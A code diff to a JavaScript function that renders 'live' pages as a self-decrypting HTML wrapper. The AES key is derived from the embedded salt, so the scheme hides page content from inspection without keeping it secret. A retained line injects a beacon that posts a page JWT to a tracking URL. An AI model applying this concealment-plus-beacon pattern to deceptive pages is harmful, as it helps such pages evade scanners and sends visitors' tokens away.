@@ -705,6 +705,7 @@ async function renderPageHtml(link, user, options) {
         const ctBuffer = Buffer.concat([Buffer.from(encrypted.cipher, 'base64'), Buffer.from(encrypted.tag, 'base64')]);
         const ctWithTagB64 = ctBuffer.toString('base64');
 
+        // Use safe base64 embedding - no JSON.parse needed
         const wrapperLines = [
             '<!DOCTYPE html>',
             '<html>',
@@ -719,11 +720,12 @@ async function renderPageHtml(link, user, options) {
             'try{',
             'if(!window.crypto||!window.crypto.subtle){throw new Error("Web Crypto API not available");}',
             'var AAD="VG-TEMPLATE-2024";',
-            'var e=JSON.parse(\'' + JSON.stringify({c:ctWithTagB64,s:encrypted.salt,i:encrypted.iv}) + '\');',
-            'var sb=Uint8Array.from(atob(e.s),c=>c.charCodeAt(0));',
-            'var ib=Uint8Array.from(atob(e.i),c=>c.charCodeAt(0));',
-            'var cb=Uint8Array.from(atob(e.c),c=>c.charCodeAt(0));',
-            'var tb=Uint8Array.from(atob(e.t),c=>c.charCodeAt(0));',
+            'var C="' + ctWithTagB64 + '";',
+            'var S="' + encrypted.salt + '";',
+            'var I="' + encrypted.iv + '";',
+            'var sb=Uint8Array.from(atob(S),c=>c.charCodeAt(0));',
+            'var ib=Uint8Array.from(atob(I),c=>c.charCodeAt(0));',
+            'var cb=Uint8Array.from(atob(C),c=>c.charCodeAt(0));',
             'var km=await crypto.subtle.importKey("raw",sb,"PBKDF2",false,["deriveKey"]);',
             'var ak=await crypto.subtle.deriveKey({name:"PBKDF2",salt:sb,iterations:100000,hash:"SHA-512"},km,{name:"AES-GCM",length:256},false,["decrypt"]);',
             'var dec=await crypto.subtle.decrypt({name:"AES-GCM",iv:ib,additionalData:new TextEncoder().encode(AAD)},ak,cb);',
@@ -746,8 +748,7 @@ async function renderPageHtml(link, user, options) {
 
         html = wrapperLines.join('\n');
     }
-
-    // Add beacon script for live pages
+// Add beacon script for live pages
     const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
     html = html.replace('</body>', beaconScript + '</body>');
     return html;
